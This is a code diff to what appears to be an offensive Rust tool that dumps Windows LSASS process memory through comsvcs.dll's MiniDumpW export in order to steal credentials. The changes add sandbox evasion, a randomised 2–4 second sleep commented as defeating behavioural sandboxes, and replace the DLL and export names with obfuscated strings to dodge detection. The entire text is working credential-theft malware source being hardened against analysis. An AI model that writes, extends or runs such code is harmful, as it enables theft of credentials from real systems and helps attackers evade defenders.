@@ -199,6 +199,19 @@ pub unsafe fn extract_lsass_creds(config: &CredDumpConfig) -> Result<CredDumpRes
         warnings: Vec::new(),
     };
 
+    // Anti-emulation: random 2-4s sleep before sensitive operations.
+    // Most behavioral sandboxes time out within 1-2 seconds of wall time.
+    #[cfg(target_os = "windows")]
+    {
+        let delay_ms = (std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis()
+            % 2000
+            + 2000) as u64;
+        std::thread::sleep(std::time::Duration::from_millis(delay_ms));
+    }
+
     // Step 1: Resolve syscall numbers
     let numbers = SyscallNumbers::resolve();
     debug!(
@@ -531,15 +544,18 @@ unsafe fn find_lsass_pid(_numbers: &SyscallNumbers) -> Result<u32> {
 unsafe fn dump_lsass_via_minidump(pid: u32, numbers: &SyscallNumbers) -> Result<Vec<u8>> {
     unsafe {
         use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
+        use windows::core::PCSTR;
 
-        // Step 1: Load comsvcs.dll into our process
-        let comsvcs = LoadLibraryA(windows::core::s!("comsvcs.dll")).map_err(|e| {
+        // Step 1: Load comsvcs.dll into our process (obfuscated string)
+        let comsvcs_name = crate::xs!("comsvcs.dll");
+        let comsvcs = LoadLibraryA(PCSTR(comsvcs_name.as_bytes().as_ptr())).map_err(|e| {
             OverthroneError::PostExploitation(format!("LoadLibrary(comsvcs.dll): {e}"))
         })?;
 
-        // Step 2: Get MiniDumpW export
-        let minidump_w =
-            GetProcAddress(comsvcs, windows::core::s!("MiniDumpW")).ok_or_else(|| {
+        // Step 2: Get MiniDumpW export (obfuscated string)
+        let minidump_name = crate::xs!("MiniDumpW");
+        let minidump_w = GetProcAddress(comsvcs, PCSTR(minidump_name.as_bytes().as_ptr()))
+            .ok_or_else(|| {
                 OverthroneError::PostExploitation(
                     "MiniDumpW export not found in comsvcs.dll".into(),
                 )
